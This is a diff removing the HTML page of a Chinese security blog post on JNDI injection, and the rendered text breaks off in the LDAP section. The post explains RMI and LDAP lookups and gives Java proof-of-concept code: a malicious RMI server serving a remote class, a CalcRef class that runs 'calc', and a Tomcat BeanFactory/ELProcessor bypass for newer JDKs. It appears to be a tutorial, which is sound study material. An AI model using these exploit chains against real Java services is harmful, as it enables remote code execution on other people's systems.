@@ -1,574 +1,150 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>JNDI注入 | w8nn9z Blog</title>
-<meta name="keywords" content="">
-<meta name="description" content="JNDI注入 - w8nn9z Blog">
-<meta name="author" content="">
-<link rel="canonical" href="https://z9nn8w.github.io/posts/web/jndiinjection/">
-
-<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/web/jndiinjection/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/web/jndiinjection/">
-  <meta property="og:site_name" content="w8nn9z Blog">
-  <meta property="og:title" content="JNDI注入">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-09T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-10-09T00:00:00+00:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JNDI注入">
-<meta name="twitter:description" content="">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://z9nn8w.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "WEB",
-      "item": "https://z9nn8w.github.io/posts/web/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "JNDI注入",
-      "item": "https://z9nn8w.github.io/posts/web/jndiinjection/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "JNDI注入",
-  "name": "JNDI注入",
-  "description": "",
-  "keywords": [
-    
-  ],
-  "articleBody": "JNDI与RMI、LDAP的关系 JNDI (Java Naming and Directory Interface)：是一个接口，一个统一的查询标准，本身不提供服务，只提供一套标准的API来查找东西\nRMI (Remote Method Invocation) 和 LDAP (Lightweight Directory Access Protocol)：是具体的服务，是两种不同类型的实现。它们是真正存储信息、提供对象的地方\nRMI 实现 远程接口 IRmoteObj.java：\nimport java.rmi.Remote; import java.rmi.RemoteException; public interface IRmoteObj extends Remote { String sayHello(String name) throws RemoteException; } 服务器对象实现 RmoteObjImpl.java：\nimport java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RmoteObjImpl extends UnicastRemoteObject implements IRmoteObj{ public RmoteObjImpl() throws RemoteException { super(); } @Override public String sayHello(String name) throws RemoteException { System.out.println(\"sayHello\"); return name; } } 服务器注册和绑定 RMIServer.java：\nimport java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws Exception { RmoteObjImpl remoteObj = new RmoteObjImpl(); Registry registry = LocateRegistry.createRegistry(1099); registry.rebind(\"remoteObj\", remoteObj); } } 客户端查找和调用 RMIClient.java：\nimport java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIClient { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); IRmoteObj remoteObj = (IRmoteObj) registry.lookup(\"remoteObj\"); System.out.println(remoteObj.sayHello(\"hello\")); } } JNDI RMI 实现 JNDIRMIServer.java：\nimport javax.naming.InitialContext; import java.rmi.registry.LocateRegistry; public class JNDIRMIServer { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); RmoteObjImpl remoteObj = new RmoteObjImpl(); InitialContext initialContext = new InitialContext(); initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", remoteObj); } } JNDIRMIClinet.java：\nimport javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String args[]) throws Exception { InitialContext initialContext = new InitialContext(); IRmoteObj remoteObj = (IRmoteObj) initialContext.lookup(\"rmi://127.0.0.1:1099/remoteObj\"); System.out.println(remoteObj.sayHello(\"hello\")); } } JNDI RMI 注入 攻击者在自己服务器上构造恶意的JNDI RMI服务，JNDIRMIServer.java：\nimport javax.naming.InitialContext; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; public class JNDIRMIServer { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); // RmoteObjImpl remoteObj = new RmoteObjImpl(); InitialContext initialContext = new InitialContext(); // initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", remoteObj); Reference refObj = new Reference(\"CalcRef\", \"CalcRef\", \"http://127.0.0.1:1088/\"); initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", refObj); } } CalcRef.java：\nimport java.io.IOException; public class CalcRef { public CalcRef() throws IOException { Runtime.getRuntime().exec(\"calc\"); } } 同时要求JNDIRMIClient端lookup参数可控，JNDIRMIClient.java：\nimport javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String args[]) throws Exception { InitialContext initialContext = new InitialContext(); IRmoteObj remoteObj = (IRmoteObj) initialContext.lookup(\"rmi://127.0.0.1:1099/remoteObj\"); // 此处应是攻击者ip System.out.println(remoteObj.sayHello(\"hello\")); } } Java 8u121+ (包括 Java 9, 11, 17, 21 等): Oracle 引入了安全补丁，将 com.sun.jndi.rmi.object.trustURLCodebase 默认设置为 false。这直接阻止了 JVM 从 Codebase URL 加载远程类，使 RMI 协议的 JNDI 注入几乎无法利用\nJNDI LADP 注入 import javax.naming.InitialContext; import javax.naming.Reference; public class JNDILDAPServer { public static void main(String[] args) throws Exception { Reference refObj = new Reference(\"CalcRef\", \"CalcRef\", \"http://127.0.0.1:1088/\"); InitialContext initialContext = new InitialContext(); initialContext.rebind(\"ldap://127.0.0.1:10389/cn=test,dc=example,dc=com\", refObj); } } import javax.naming.InitialContext; public class JNDILDAPClient { public static void main(String[] args) throws Exception { InitialContext initialContext = new InitialContext(); initialContext.lookup(\"ldap://127.0.0.1:10389/cn=test,dc=example,dc=com\"); } } JNDI jdk高版本注入 需要添加tomcat相关依赖，pom.xml：\norg.apache.tomcat.embed tomcat-embed-core 8.5.71 javax.el javax.el-api 3.0.0 org.glassfish javax.el 3.0.0 JNDIRMIServerHighBypass.java：\nimport org.apache.naming.ResourceRef; import javax.naming.InitialContext; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; public class JNDIRMIServerHighBypass { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); InitialContext initialContext = new InitialContext(); ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", null); resourceRef.add(new StringRefAddr(\"forceString\", \"x=eval\")); resourceRef.add(new StringRefAddr(\"x\", \"Runtime.getRuntime().exec('calc')\")); initialContext.rebind(\"rmi://127.0.0.1:1099/remoteObj\", resourceRef); } } ",
-  "wordCount" : "879",
-  "inLanguage": "en",
-  "datePublished": "2025-10-09T00:00:00Z",
-  "dateModified": "2025-10-09T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://z9nn8w.github.io/posts/web/jndiinjection/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "w8nn9z Blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://z9nn8w.github.io/favicon.ico"
-    }
-  }
-}
-</script>
-</head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
-                    <span>搜索</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/posts" title="文章">
-                    <span>文章</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/archives" title="归档">
-                    <span>归档</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/about" title="关于">
-                    <span>关于</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-<article class="post-single">
-  <header class="post-header">
-    
-    <h1 class="post-title entry-hint-parent">
-      JNDI注入
-    </h1>
-    <div class="post-meta"><span title='2025-10-09 00:00:00 +0000 UTC'>October 9, 2025</span>
-
-</div>
-  </header> <aside id="toc-container" class="toc-container wide">
-    <div class="toc">
-        <details >
-            <summary accesskey="c" title="(Alt + C)">
-                <span class="details">Table of Contents</span>
-            </summary>
-
-            <div class="inner"><ul>
-                    <li>
-                        <a href="#jndi%e4%b8%8ermildap%e7%9a%84%e5%85%b3%e7%b3%bb" aria-label="JNDI与RMI、LDAP的关系">JNDI与RMI、LDAP的关系</a></li>
-                    <li>
-                        <a href="#rmi-%e5%ae%9e%e7%8e%b0" aria-label="RMI 实现">RMI 实现</a></li>
-                    <li>
-                        <a href="#jndi-rmi-%e5%ae%9e%e7%8e%b0" aria-label="JNDI RMI 实现">JNDI RMI 实现</a></li>
-                    <li>
-                        <a href="#jndi-rmi-%e6%b3%a8%e5%85%a5" aria-label="JNDI RMI 注入">JNDI RMI 注入</a></li>
-                    <li>
-                        <a href="#jndi-ladp-%e6%b3%a8%e5%85%a5" aria-label="JNDI LADP 注入">JNDI LADP 注入</a></li>
-                    <li>
-                        <a href="#jndi-jdk%e9%ab%98%e7%89%88%e6%9c%ac%e6%b3%a8%e5%85%a5" aria-label="JNDI jdk高版本注入">JNDI jdk高版本注入</a>
-                    </li>
-                </ul>
-            </div>
-        </details>
-    </div>
-</aside>
-<script>
-    let activeElement;
-    let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
-        checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
-        if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
-        }
-    
-        
-        const topLink = document.getElementById('top-link');
-        if (topLink) {
-            topLink.addEventListener('click', (event) => {
-                
-                event.preventDefault();
-    
-                
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            });
-        }
-    }, false);
-    
-    window.addEventListener('resize', function(event) {
-        checkTocPosition();
-    }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
-    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
-    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
-    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
-    function checkTocPosition() {
-        const width = document.body.scrollWidth;
-    
-        if (width - main - (toc * 2) - (gap * 4) > 0) {
-            document.getElementById("toc-container").classList.add("wide");
-        } else {
-            document.getElementById("toc-container").classList.remove("wide");
-        }
-    }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
-    }
-    
-</script>
-
-  <div class="post-content"><h2 id="jndi与rmildap的关系">JNDI与RMI、LDAP的关系<a hidden class="anchor" aria-hidden="true" href="#jndi与rmildap的关系">#</a></h2>
-<p>JNDI (Java Naming and Directory Interface)：是一个接口，一个统一的查询标准，本身不提供服务，只提供一套标准的API来查找东西</p>
-<p>RMI (Remote Method Invocation) 和 LDAP (Lightweight Directory Access Protocol)：是具体的服务，是两种不同类型的实现。它们是真正存储信息、提供对象的地方</p>
-<h2 id="rmi-实现">RMI 实现<a hidden class="anchor" aria-hidden="true" href="#rmi-实现">#</a></h2>
-<p>远程接口 IRmoteObj.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.Remote;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.RemoteException;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IRmoteObj</span> <span style="color:#66d9ef">extends</span> Remote {
-</span></span><span style="display:flex;"><span>    String <span style="color:#a6e22e">sayHello</span>(String name) <span style="color:#66d9ef">throws</span> RemoteException;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>服务器对象实现 RmoteObjImpl.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.RemoteException;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.server.UnicastRemoteObject;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RmoteObjImpl</span> <span style="color:#66d9ef">extends</span> UnicastRemoteObject <span style="color:#66d9ef">implements</span> IRmoteObj{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">RmoteObjImpl</span>() <span style="color:#66d9ef">throws</span> RemoteException {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">sayHello</span>(String name) <span style="color:#66d9ef">throws</span> RemoteException {
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;sayHello&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> name;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>服务器注册和绑定 RMIServer.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.Registry;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RMIServer</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        RmoteObjImpl remoteObj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RmoteObjImpl();
-</span></span><span style="display:flex;"><span>        Registry registry <span style="color:#f92672">=</span> LocateRegistry.<span style="color:#a6e22e">createRegistry</span>(1099);
-</span></span><span style="display:flex;"><span>        registry.<span style="color:#a6e22e">rebind</span>(<span style="color:#e6db74">&#34;remoteObj&#34;</span>, remoteObj);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>客户端查找和调用 RMIClient.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.Registry;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RMIClient</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        Registry registry <span style="color:#f92672">=</span> LocateRegistry.<span style="color:#a6e22e">getRegistry</span>(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, 1099);
-</span></span><span style="display:flex;"><span>        IRmoteObj remoteObj <span style="color:#f92672">=</span> (IRmoteObj) registry.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;remoteObj&#34;</span>);
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(remoteObj.<span style="color:#a6e22e">sayHello</span>(<span style="color:#e6db74">&#34;hello&#34;</span>));
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="jndi-rmi-实现">JNDI RMI 实现<a hidden class="anchor" aria-hidden="true" href="#jndi-rmi-实现">#</a></h2>
-<p>JNDIRMIServer.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDIRMIServer</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        LocateRegistry.<span style="color:#a6e22e">createRegistry</span>(1099);
-</span></span><span style="display:flex;"><span>        RmoteObjImpl remoteObj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RmoteObjImpl();
-</span></span><span style="display:flex;"><span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
-</span></span><span style="display:flex;"><span>        initialContext.<span style="color:#a6e22e">rebind</span>(<span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>, remoteObj);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>JNDIRMIClinet.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDIRMIClient</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String args<span style="color:#f92672">[]</span>) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
-</span></span><span style="display:flex;"><span>        IRmoteObj remoteObj <span style="color:#f92672">=</span> (IRmoteObj) initialContext.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>);
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(remoteObj.<span style="color:#a6e22e">sayHello</span>(<span style="color:#e6db74">&#34;hello&#34;</span>));
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="jndi-rmi-注入">JNDI RMI 注入<a hidden class="anchor" aria-hidden="true" href="#jndi-rmi-注入">#</a></h2>
-<p>攻击者在自己服务器上构造恶意的JNDI RMI服务，JNDIRMIServer.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Reference;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDIRMIServer</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        LocateRegistry.<span style="color:#a6e22e">createRegistry</span>(1099);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//        RmoteObjImpl remoteObj = new RmoteObjImpl();</span>
-</span></span><span style="display:flex;"><span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//        initialContext.rebind(&#34;rmi://127.0.0.1:1099/remoteObj&#34;, remoteObj);</span>
-</span></span><span style="display:flex;"><span>        Reference refObj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Reference(<span style="color:#e6db74">&#34;CalcRef&#34;</span>, <span style="color:#e6db74">&#34;CalcRef&#34;</span>, <span style="color:#e6db74">&#34;http://127.0.0.1:1088/&#34;</span>);
-</span></span><span style="display:flex;"><span>        initialContext.<span style="color:#a6e22e">rebind</span>(<span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>, refObj);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>CalcRef.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CalcRef</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">CalcRef</span>() <span style="color:#66d9ef">throws</span> IOException {
-</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>同时要求JNDIRMIClient端lookup参数可控，JNDIRMIClient.java：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDIRMIClient</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String args<span style="color:#f92672">[]</span>) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
-</span></span><span style="display:flex;"><span>        IRmoteObj remoteObj <span style="color:#f92672">=</span> (IRmoteObj) initialContext.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>);  <span style="color:#75715e">// 此处应是攻击者ip</span>
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(remoteObj.<span style="color:#a6e22e">sayHello</span>(<span style="color:#e6db74">&#34;hello&#34;</span>));
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Java 8u121+ (包括 Java 9, 11, 17, 21 等): Oracle 引入了安全补丁，将 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认设置为 false。这直接阻止了 JVM 从 Codebase URL 加载远程类，使 RMI 协议的 JNDI 注入几乎无法利用</p>
-<h2 id="jndi-ladp-注入">JNDI LADP 注入<a hidden class="anchor" aria-hidden="true" href="#jndi-ladp-注入">#</a></h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
